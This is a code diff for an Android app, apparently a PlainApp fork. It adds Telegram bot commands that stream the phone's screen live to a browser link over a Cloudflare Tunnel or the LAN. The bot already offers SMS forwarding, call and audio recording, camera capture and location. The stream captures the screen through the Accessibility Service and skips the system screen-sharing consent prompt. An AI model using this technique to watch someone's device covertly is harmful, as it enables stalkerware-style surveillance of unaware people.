@@ -168,6 +168,8 @@ object TelegramBotManager {
         "logs" to "📋 Notification log history",
         "files" to "📁 Browse storage — tap folders to open, files to download",
         "screenshot" to "📸 Take a screenshot",
+        "livescreen" to "📺 Live screen stream — opens in browser, no screensharing needed",
+        "livestop" to "⏹ Stop the live screen stream",
         "photo" to "📷 Camera photo — /photo [front|back]",
         "audio" to "🎙 Record audio — interactive duration picker",
         "video" to "🎬 Record video — pick camera, then duration",
@@ -678,6 +680,8 @@ object TelegramBotManager {
             "logs" -> cmdLogs(args)
             "files" -> cmdFiles(args)
             "screenshot" -> cmdScreenshot()
+            "livescreen", "screenlive", "screenview", "liveview", "streamscreen" -> cmdLiveScreen()
+            "livestop", "stoplive", "stopstream", "stopscreenstream" -> cmdLiveStop()
             "photo" -> cmdPhoto(args)
             "audio" -> cmdAudio(args)
             "video" -> cmdVideo(args)
@@ -2681,7 +2685,7 @@ object TelegramBotManager {
             Section("💬 Communication", listOf("messages","sms","sendsms","mms","schedulesms","calls","livecall","callnow","recordings","forwardsms")),
             Section("👥 Contacts", listOf("contacts","find","addcontact","deletecontact","blocknumber","contactgroups")),
             Section("📁 Files & Storage", listOf("files","storage","docs","filehash","deletefile")),
-            Section("📸 Media", listOf("screenshot","photo","audio","video","music","videos","images","shots","forwardphotos","forwardshots")),
+            Section("📸 Media", listOf("screenshot","livescreen","livestop","photo","audio","video","music","videos","images","shots","forwardphotos","forwardshots")),
             Section("📱 Apps", listOf("apps","blockapp","unblockapp","blockedapps","launch","screentime","launches","clearcache")),
             Section("📦 Backup & Restore", listOf("backup","restore")),
             Section("📊 Device Info", listOf("device","battery","batteryhistory","location","sim","vpn","permissions","networkinfo","wifiscan","netusage")),
@@ -3459,6 +3463,50 @@ object TelegramBotManager {
         } catch (e: Exception) {
             sendMessage("❌ Screenshot error: ${htmlEsc(e.message ?: "")}")
         }
+    }
+
+    private suspend fun cmdLiveScreen() {
+        val ctx = MainApp.instance
+        val svcActive = com.ismartcoding.plain.services.PlainAccessibilityService.instance != null
+        if (!svcActive) {
+            sendMessage(
+                "❌ <b>Accessibility Service not connected.</b>\n\n" +
+                "Enable it in Settings → Accessibility → PlainApp, then try again.",
+            )
+            return
+        }
+        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
+            sendMessage("❌ Live screen requires Android 11+ (this device is API ${android.os.Build.VERSION.SDK_INT}).")
+            return
+        }
+        val streamToken = com.ismartcoding.plain.web.routes.LiveStreamTokenManager.issue()
+        val cfEnabled  = com.ismartcoding.plain.preferences.CloudflareTunnelEnabledPreference.getAsync(ctx)
+        val cfHostname = com.ismartcoding.plain.preferences.CloudflareTunnelHostnamePreference.getAsync(ctx)
+        val baseUrl    = if (cfEnabled && cfHostname.isNotBlank()) "https://$cfHostname"
+                         else "http://${com.ismartcoding.lib.helpers.NetworkHelper.getDeviceIP4()}:${TempData.httpPort}"
+        val viewUrl  = "$baseUrl/screen/view?t=$streamToken"
+        val rows = listOf(
+            listOf("⏹ Stop stream" to "run:livestop"),
+            listOf("📸 Screenshot instead" to "run:screenshot"),
+        )
+        sendMessage(
+            "📺 <b>Live Screen Stream</b>\n\n" +
+            "Open this link in your browser to watch the screen live:\n\n" +
+            "🔗 <code>$viewUrl</code>\n\n" +
+            "• Tap the link above to copy\n" +
+            "• Choose FPS (2 / 5 / 10 / 15) in the page\n" +
+            "• Stream auto-stops when all viewers close the tab\n" +
+            "• Link valid for <b>2 hours</b>\n" +
+            "• Uses Accessibility screenshot — no screensharing API\n\n" +
+            "⚠️ <i>Link works over Cloudflare Tunnel or LAN only.</i>",
+            replyMarkup = TelegramApiClient.inlineKeyboard(rows),
+        )
+    }
+
+    private suspend fun cmdLiveStop() {
+        com.ismartcoding.plain.services.LiveScreenCapturer.forceStop()
+        com.ismartcoding.plain.web.routes.LiveStreamTokenManager.revokeAll()
+        sendMessage("⏹ <b>Live screen stream stopped.</b>\nAll stream links have been revoked.")
     }
 
     @SuppressLint("MissingPermission")
